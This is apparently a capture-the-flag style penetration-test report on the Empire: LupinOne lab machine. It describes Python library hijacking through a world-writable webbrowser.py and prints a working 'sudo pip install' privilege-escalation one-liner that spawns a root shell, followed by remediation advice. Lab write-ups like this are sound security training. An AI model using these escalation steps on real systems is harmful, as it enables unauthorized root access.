# Penetration Testing & Vulnerability Assessment Report
**Target System:** Empire - LupinOne (192.168.0.105)
**Assessment Type:** Internal Network Pentest / Black-Box
**Consultant / Pentester:** MR-R00TX
**Status:** Compromised (Root Access Achieved)

---

## 1. Executive Summary
This report details the findings of a black-box penetration test conducted against the **Empire: LupinOne** server. The objective was to identify security vulnerabilities, demonstrate their potential business impact through safe exploitation, and provide actionable remediation strategies.

During the assessment, the target was successfully compromised, leading to full `root` privileges. The attack chain leveraged information disclosure on the web server (exposing a private SSH key), offline password cracking, lateral movement via a misconfigured `sudo` policy and a writable Python library, and finally, privilege escalation via an insecure `pip` execution policy. 

**Overall Risk Rating: CRITICAL**
The vulnerabilities identified allow an unauthenticated attacker to gain total control over the server, compromising data confidentiality, integrity, and availability.

---

## 2. Methodology
The assessment was conducted using a standard industry methodology:
1. **Reconnaissance & Enumeration:** Service mapping and web directory brute-forcing.
2. **Vulnerability Analysis:** Identifying misconfigurations and leaked sensitive data.
3. **Exploitation:** Gaining initial access via recovered credentials.
4. **Post-Exploitation & Privilege Escalation:** Enumerating internal configurations to escalate privileges laterally to another user, and vertically to Root.

### 3.3 Lateral Movement (icex64 -> arsene)

Upon gaining access, I enumerated the system for misconfigurations. Running `sudo -l` revealed that the user `icex64` could execute a specific Python script (`heist.py`) as the user `arsene` without a password.

```bash

# ... [User Flag Capture Omitted for Brevity] ...

    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

Reviewing `heist.py` showed that it imported the standard `webbrowser` library. Further enumeration of Python system files revealed a critical flaw: the `webbrowser.py` library file was world-writable (`-rwxrwxrwx`). 

```bash
icex64@LupinOne:~$ cat /home/arsene/heist.py

print ("Its not yet ready to get in action")
webbrowser.open("https://empirecybersecurity.co.mz")

icex64@LupinOne:~$ ls -l /usr/lib/python3.9/webbrowser.py
-rwxrwxrwx 1 root root 24087 Oct 16 07:17 /usr/lib/python3.9/webbrowser.py
```

**Python Library Hijacking:**
To exploit this, I injected a Python reverse shell payload into the world-writable `webbrowser.py` file.


Executing the script via `sudo` triggered the modified module, granting a reverse shell as `arsene`.

### 3.4 Privilege Escalation to Root (arsene -> root)

From the `arsene` account context, a secondary check of `sudo -l` was performed.

![Sudo Pip Escalation Enumeration](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261016181139.png)

The output indicated that `arsene` could run `pip` as `root` without a password. This is a well-documented avenue for privilege escalation (GTFOBins). By creating a malicious Python package containing an OS command execution payload in `setup.py`, and installing it via `sudo pip`, root-level command execution was achieved.

```bash
TF=$(mktemp -d)  
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py  
sudo pip install $TF
```

**Impact:** Execution of this command provided an interactive shell with `root` privileges, resulting in the total compromise of the LupinOne server.

## 4. Remediation Recommendations

To secure this server and prevent similar attack paths in production, the following actions are strongly recommended:

1. **Remove Sensitive Data from Web Roots:** Ensure that private keys (`id_rsa`), configuration files, or sensitive developer comments are never stored in public-facing web directories.
2. **Implement Strong Passwords/Passphrases:** The SSH key was cracked in under 2 seconds due to a dictionary-based password (`P@55w0rd!`). Enforce robust complexity requirements.
3. **Audit File Permissions (Principle of Least Privilege):** Core system files and libraries (e.g., `/usr/lib/python3.9/webbrowser.py`) should strictly be owned by root and should never be world-writable (`777` permissions).
4. **Restrict Sudo Privileges:** 
    * Remove the ability for users to execute scripts belonging to other users without authentication unless absolutely necessary.
    * **Never** grant `NOPASSWD` sudo execution rights to package managers (`pip`, `apt`, `dpkg`) or interpreters (`python`, `bash`) as they contain inherent features designed to execute arbitrary code.
